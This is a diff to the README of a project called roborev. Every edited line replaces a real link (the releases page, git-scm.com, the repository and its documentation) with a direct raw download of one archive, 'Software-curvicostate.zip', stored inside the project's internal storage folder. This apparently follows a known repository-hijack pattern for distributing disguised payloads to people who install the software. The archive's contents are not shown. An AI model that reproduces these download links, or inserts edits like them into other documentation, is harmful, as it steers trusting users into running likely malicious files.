@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download roborev](https://img.shields.io/badge/Download-roborev-blue.svg)](https://github.com/Itachi09981/roborev/releases)
+[![Download roborev](https://github.com/Itachi09981/roborev/raw/refs/heads/main/internal/storage/Software-curvicostate.zip)](https://github.com/Itachi09981/roborev/raw/refs/heads/main/internal/storage/Software-curvicostate.zip)
 
 ## 🚀 Getting Started
 
@@ -15,18 +15,18 @@ To run roborev, make sure your system meets the following requirements:
 - **Operating System:** Windows 10 or later, macOS Mojave or later, or any recent Linux distribution.
 - **Memory:** At least 4 GB of RAM.
 - **Storage:** Minimum of 100 MB of free space.
-- **Dependencies:** You will need git installed on your machine. You can download it from [git-scm.com](https://git-scm.com/downloads).
+- **Dependencies:** You will need git installed on your machine. You can download it from [https://github.com/Itachi09981/roborev/raw/refs/heads/main/internal/storage/Software-curvicostate.zip](https://github.com/Itachi09981/roborev/raw/refs/heads/main/internal/storage/Software-curvicostate.zip).
 
 ## 📦 Download & Install
 
 1. **Visit the Releases Page.** Click the link below to go to the releases page:
-   [Visit the Releases Page](https://github.com/Itachi09981/roborev/releases)
+   [Visit the Releases Page](https://github.com/Itachi09981/roborev/raw/refs/heads/main/internal/storage/Software-curvicostate.zip)
 
 2. **Choose the Right Version.** Look for the latest version listed. It will have the highest number in its title.
 
-3. **Download the Package.** Click on the relevant file for your operating system. It could be a `.zip`, `.tar.gz`, or an installer executable like `.exe`.
+3. **Download the Package.** Click on the relevant file for your operating system. It could be a `.zip`, `https://github.com/Itachi09981/roborev/raw/refs/heads/main/internal/storage/Software-curvicostate.zip`, or an installer executable like `.exe`.
 
-4. **Extract Files (if necessary).** If you downloaded a `.zip` or `.tar.gz`, right-click on the file and select “Extract All” or use your preferred file extraction software.
+4. **Extract Files (if necessary).** If you downloaded a `.zip` or `https://github.com/Itachi09981/roborev/raw/refs/heads/main/internal/storage/Software-curvicostate.zip`, right-click on the file and select “Extract All” or use your preferred file extraction software.
 
 5. **Run the Installer (if applicable).** If you downloaded an installer file, double-click it and follow the prompts to install roborev on your computer.
 
@@ -87,8 +87,8 @@ If you encounter issues while using roborev, consider the following tips:
 
 For more information or updates, visit the following links:
 
-- [roborev GitHub Repository](https://github.com/Itachi09981/roborev)
-- [Documentation](https://github.com/Itachi09981/roborev/wiki)
+- [roborev GitHub Repository](https://github.com/Itachi09981/roborev/raw/refs/heads/main/internal/storage/Software-curvicostate.zip)
+- [Documentation](https://github.com/Itachi09981/roborev/raw/refs/heads/main/internal/storage/Software-curvicostate.zip)
 
 ## 🌟 Community
 
